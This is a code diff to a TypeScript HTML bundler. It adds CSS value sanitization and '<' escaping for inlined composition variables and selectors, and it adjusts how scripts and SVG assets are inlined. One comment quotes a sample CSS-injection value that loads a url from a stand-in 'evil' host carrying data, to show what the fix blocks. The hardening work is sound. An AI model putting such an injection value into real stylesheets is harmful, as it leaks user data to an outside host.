@@ -1,6 +1,7 @@
 import { markFlattenedInnerRoot } from "../runtime/flattenedRoot";
 export { FLATTENED_INNER_ROOT_STRIP_ATTRS } from "../runtime/flattenedRoot";
-import { parseHostVariableValues } from "../runtime/getVariables";
+import { parseHostVariableValues, warnUnknownEnumValues } from "../runtime/getVariables";
+import { sanitizeCssValue } from "../runtime/applyVariableBindings";
 import { cssVariableName } from "../tokenSlug";
 import { readFileSync, existsSync } from "fs";
 import { resolve, relative, dirname, isAbsolute, sep } from "path";
@@ -310,6 +311,16 @@ function maybeInlineRelativeAssetUrl(urlValue: string, projectDir: string): stri
   return appendSuffixToUrl(dataUrl, suffix);
 }
 
+function isExternalSvgFragmentUse(el: Element, attr: string, urlValue: string): boolean {
+  if (el.tagName.toLowerCase() !== "use") return false;
+  if (attr !== "href" && attr !== "xlink:href") return false;
+  if (!isRelativeUrl(urlValue)) return false;
+  const hashIdx = urlValue.indexOf("#");
+  if (hashIdx <= 0) return false;
+  const pathBeforeFragment = urlValue.slice(0, hashIdx).split("?", 1)[0] ?? "";
+  return pathBeforeFragment.toLowerCase().endsWith(".svg");
+}
+
 function warnColorGradingLutNotInlined(lutSrc: string): void {
   const trimmed = lutSrc.trim();
   if (!isRelativeUrl(trimmed)) return;
@@ -379,8 +390,17 @@ function rewriteCssUrlsWithInlinedAssets(cssText: string, projectDir: string): s
   );
 }
 
+/**
+ * Selectors built here are serialized inside a `<style>` element, which is a RAW
+ * TEXT element: the tokenizer ends it at the first `</style` regardless of CSS
+ * context, and the serializer does not escape its content. Backslash and quote
+ * escaping keeps the selector's own string grammar valid; it does nothing about
+ * element termination, so `<` needs the CSS hex escape too. `\3c ` is legal
+ * wherever a string is, and matches the same attribute value, so selectors keep
+ * matching. The trailing space terminates the escape.
+ */
 function cssAttributeSelector(attr: string, value: string): string {
-  const escaped = value.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
+  const escaped = value.replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/</g, "\\3c ");
   return `[${attr}="${escaped}"]`;
 }
 
@@ -843,6 +863,10 @@ export async function bundleToSingleHtml(
   for (const el of [...document.querySelectorAll("script[src]")]) {
     const src = el.getAttribute("src");
     if (!src || !isRelativeUrl(src)) continue;
+    // Module scripts can contain static imports whose resolution is relative
+    // to the script URL. Folding their source into a classic inline script
+    // both drops module semantics and changes the import base URL.
+    if ((el.getAttribute("type") || "").trim().toLowerCase() === "module") continue;
     const jsPath = resolveEntryPath(src);
     const js = jsPath ? safeReadFile(jsPath) : null;
     if (js == null) continue;
@@ -884,6 +908,13 @@ export async function bundleToSingleHtml(
     parseHtml: parseHTMLContent,
     hostIdentityMap: hostIdentityByElement,
     rewriteInlineStyles: true,
+    // A sub-composition's SIBLING assets (`_shared.css` next to it) must be
+    // re-pointed at its own directory when its content moves to the root
+    // document; project-root refs with no such sibling stay as authored.
+    assetExists: (path: string) => {
+      const resolved = resolveEntryPath(path);
+      return resolved !== null && existsSync(resolved);
+    },
     flattenInnerRoot: prepareFlattenedInnerRoot,
     readVariableDefaults: readDeclaredDefaults,
     parseHostVariables: parseHostVariableValues,
@@ -958,6 +989,13 @@ export async function bundleToSingleHtml(
       const mergedVariables = runtimeCompId ? parseHostVariableValues(host) : {};
       if (runtimeCompId && Object.keys(mergedVariables).length > 0) {
         compVariablesByComp[runtimeCompId] = mergedVariables;
+      }
+      // Same defect on the <template> mount as on the data-composition-src
+      // mount (see inlineSubCompositions): the merged instance values are
+      // baked in here, so only compile time can see a value that falls back.
+      if (runtimeCompId) {
+        warnUnknownEnumValues(innerDoc.documentElement, mergedVariables, runtimeCompId);
+        warnUnknownEnumValues(innerRoot, mergedVariables, runtimeCompId);
       }
       pushSubCompVariableStyles(
         innerDoc,
@@ -1070,6 +1108,11 @@ export async function bundleToSingleHtml(
     for (const attr of ["src", "href", "poster", "xlink:href"] as const) {
       const value = el.getAttribute(attr);
       if (!value) continue;
+      // Chromium requires external SVG <use> fragments to be same-origin with
+      // the document. Converting the sprite to a data: URL makes it an opaque
+      // origin and triggers "Unsafe attempt to load URL ... from frame".
+      // Keep the project-relative URL; render/check servers already expose it.
+      if (isExternalSvgFragmentUse(el, attr, value)) continue;
       const inlined = maybeInlineRelativeAssetUrl(value, projectDir);
       if (inlined) el.setAttribute(attr, inlined);
     }
@@ -1102,6 +1145,37 @@ export async function bundleToSingleHtml(
   return document.toString();
 }
 
+/**
+ * Make a scalar variable value safe to bake into a stylesheet.
+ *
+ * Two independent hazards, so two layers:
+ *
+ * 1. `sanitizeCssValue` is the runtime's own contract (`applyVariableBindings`,
+ *    and `docs/concepts/variables.mdx` promises it): a scalar folded into
+ *    `background: var(--x)` must not be able to close the declaration and open a
+ *    new rule (`red; } body { background-image: url(//evil?data=…) }`). The
+ *    compile path has to reach the same result as the runtime — a value the
+ *    runtime strips but a compile-time emit honours would make the rendered MP4
+ *    diverge from the preview.
+ * 2. These rules are then serialized inside a `<style>` element, which is a RAW
+ *    TEXT element: HTML serialization does not escape its content and the
+ *    tokenizer ends it at the first `</style`. `\3c ` is the CSS escape for `<`,
+ *    valid in every value position including inside an unquoted `url()`, and
+ *    resolves back to `<`, so rendering is unchanged. The trailing space is
+ *    consumed as part of the escape.
+ *
+ * The sanitizer already removes `<`, so today layer 2 is redundant for values
+ * and load-bearing only for the selector (`cssAttributeSelector`, which must
+ * preserve `<` to keep matching). It stays because the two layers answer to
+ * different rules: narrowing the scalar character set must not silently reopen
+ * an element-termination hole.
+ *
+ * Variable IDs need no equivalent: `cssVariableName` slugifies them.
+ */
+function cssSafeVariableValue(value: string | number): string {
+  return sanitizeCssValue(String(value)).replace(/</g, "\\3c ");
+}
+
 /** One stylesheet rule defining primitive composition variables under `selector`. */
 function compositionVariablesCssBlock(
   variables: Record<string, unknown>,
@@ -1110,7 +1184,7 @@ function compositionVariablesCssBlock(
   const lines: string[] = [];
   for (const [id, value] of Object.entries(variables)) {
     if ((typeof value === "string" && value !== "") || typeof value === "number") {
-      lines.push(`  ${cssVariableName(id)}: ${String(value)};`);
+      lines.push(`  ${cssVariableName(id)}: ${cssSafeVariableValue(value)};`);
     }
   }
   if (lines.length === 0) return null;
@@ -1135,9 +1209,10 @@ export function emitRootCompositionVariableStyles(
   variablesByComp: Record<string, Record<string, unknown>> = {},
   overrides: Record<string, unknown> = {},
 ): boolean {
-  const layerFor = makeVariableLayer(document, overrides);
+  const authoredDefines = authoredDefinesPredicate(document);
+  const layerFor = makeVariableLayer(authoredDefines, overrides);
   const rules = [
-    ...hostScopedVariableRules(variablesByComp, overrides),
+    ...hostScopedVariableRules(variablesByComp, overrides, authoredDefines),
     ...rootDeclaredVariableRules(document, layerFor),
     ...declarerVariableRules(document, layerFor),
   ];
@@ -1154,18 +1229,23 @@ type VariableLayer = (
   hostValues: Record<string, unknown>,
 ) => Record<string, unknown>;
 
+function authoredDefinesPredicate(document: Document): (id: string) => boolean {
+  const authoredCss = [...document.querySelectorAll("style:not([data-hf-composition-variables])")]
+    .map((s) => s.textContent || "")
+    .join("\n");
+  return (id) => new RegExp(`${cssVariableName(id)}\\s*:`).test(authoredCss);
+}
+
 /**
  * Layering for one declarer: authored stylesheet definitions win over
  * declared defaults (the runtime's define-if-absent, applied statically) —
  * a var already defined in any authored <style> block is not emitted. Host
  * values and --variables overrides are explicit intent, never filtered.
  */
-function makeVariableLayer(document: Document, overrides: Record<string, unknown>): VariableLayer {
-  const authoredCss = [...document.querySelectorAll("style:not([data-hf-composition-variables])")]
-    .map((s) => s.textContent || "")
-    .join("\n");
-  const authoredDefines = (id: string): boolean =>
-    new RegExp(`${cssVariableName(id)}\\s*:`).test(authoredCss);
+function makeVariableLayer(
+  authoredDefines: (id: string) => boolean,
+  overrides: Record<string, unknown>,
+): VariableLayer {
   return (declared, hostValues) => {
     const out: Record<string, unknown> = {};
     for (const [id, value] of Object.entries(declared)) {
@@ -1181,14 +1261,24 @@ function makeVariableLayer(document: Document, overrides: Record<string, unknown
   };
 }
 
-/** Host-scoped rules: per-instance values inherited by the host's subtree. */
+/**
+ * Host-scoped rules: per-instance values inherited by the host's subtree.
+ * A composition variable, whether a declared default or an explicit
+ * data-variable-values value, never redefines a custom property authored by
+ * another part of the document. Render-time --variables overrides remain
+ * explicit user intent and always win.
+ */
 function hostScopedVariableRules(
   variablesByComp: Record<string, Record<string, unknown>>,
   overrides: Record<string, unknown>,
+  authoredDefines: (id: string) => boolean,
 ): string[] {
   const rules: string[] = [];
   for (const [compId, vars] of Object.entries(variablesByComp)) {
-    const withOverrides = { ...vars };
+    const withOverrides: Record<string, unknown> = {};
+    for (const [id, value] of Object.entries(vars)) {
+      if (!authoredDefines(id)) withOverrides[id] = value;
+    }
     for (const [id, value] of Object.entries(overrides)) {
       if (id in vars) withOverrides[id] = value;
     }
